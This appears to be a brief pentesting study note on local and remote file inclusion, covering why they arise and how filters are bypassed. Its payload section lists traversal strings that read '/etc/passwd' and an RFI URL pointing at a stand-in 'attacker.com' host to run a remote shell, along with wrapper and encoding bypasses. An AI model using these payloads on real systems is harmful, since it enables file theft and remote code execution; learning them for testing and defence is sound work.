# File Inclusion
## Types :
1. Local File Inclusion (LFI) :
	- Allows an attacker to include files that are present in the target's server, it can result in reading sensitive files etc.
2. Remote File Inclusion (RFI) :
	- Allows an attacker to include files from external location, it can lead to code execution etc.

## Why it happens :
- Takes input from a user, and using that path to a file without properly validating it :
	e.g. : If an app allows language change, we can instead of sending Russian as input, we send `../../../` to achieve directory traversal, allowing us to travel back up to the root directory, and then appending `etc/passwd` to include the ***passwd file*** 
- Sometimes controls are put in place to prevent that from happening, but some controls such as `removing ../` if not done **recursively** may be ineffective.

## Basic Payloads :
1. LFI :
	- `etc/passwd`
	- `../../../etc/passwd` 
2. RFI :
	- `http://attacker.com/malicious.php`  //to execute a remote shell
- You can use `PHP wrappers` ( e.g. `php://filter` that allows us to read `php files` ) to bypass restrictions, Double encoding, recursive payloads ( adding a `../` between each `.<it goes here>./` ) etc.
- It's really good to know what language is being used server-side (PHP, JSP, ASP, etc.)
- We can also consider Fuzzing
- More payloads can be found in the `PayloadsAllTheThings` repo on `GitHub` 



